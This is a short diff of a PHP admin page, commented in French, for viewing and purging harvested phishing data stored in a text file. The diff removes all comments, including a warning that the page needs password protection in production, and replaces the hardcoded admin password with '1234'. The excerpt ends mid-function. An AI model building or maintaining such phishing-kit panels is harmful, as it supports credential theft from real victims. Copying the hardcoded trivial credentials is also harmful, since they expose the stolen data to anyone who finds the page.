@@ -1,12 +1,8 @@
 <?php
-// Page pour visualiser les données de phishing recueillies
-// IMPORTANT: Cette page doit être protégée par un mot de passe en production
 
-// Paramètres de connexion
 $username = "admin";
-$password = "securitydemo2023";
+$password = "1234";
 
-// Vérifier si l'utilisateur est connecté
 session_start();
 $loggedIn = false;
 
@@ -21,7 +17,6 @@ if (isset($_POST['login'])) {
     $loggedIn = true;
 }
 
-// Action de purge des données
 if ($loggedIn && isset($_POST['purge'])) {
     if (file_exists('info_phishing.txt')) {
         file_put_contents('info_phishing.txt', '');
@@ -29,7 +24,6 @@ if ($loggedIn && isset($_POST['purge'])) {
     }
 }
 
-// Fonction pour afficher les données de phishing
 function displayPhishingData() {
     $file = 'info_phishing.txt';
     
